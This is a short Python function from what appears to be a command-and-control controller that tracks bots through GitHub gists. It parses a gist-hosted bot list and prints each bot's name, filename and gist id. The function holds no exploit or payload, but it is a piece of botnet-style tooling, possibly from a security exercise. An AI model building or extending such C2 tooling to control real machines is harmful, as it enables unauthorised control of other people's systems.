import sys

from Controller import gist


def list_current_bots(gist_api, bot_list):
    """
    From bot list read all the bots and list the to std in.

    :param gist_api:
    :param bot_list:
    :return: None
    """
    print("LS_BOTS EXECUTING", file=sys.stderr, end="")
    to_print = "Name\t\t\tFilename\t\t\tId\n"
    bot_list_content = gist.get_raw(gist_api, bot_list)
    lines = bot_list_content.split('\n')

    if len(lines) == 1:
        print("\nNO BOTS ALIVE", file=sys.stderr)
        return

    for line in lines:
        if not line.startswith('###'):
            continue

        print(".", file=sys.stderr, end="")

        # Name, Filename, Id
        name = line.split("[")[1].split("]")[0]
        filename = line.split("(")[1].split("#")[1].rstrip(')')
        id = line.split("(")[1].split("#")[0].split("/")[-1]

        to_print += name + "\t\t" + filename + "\t\t" + id + "\n"

    print(file=sys.stderr)
    print(to_print)
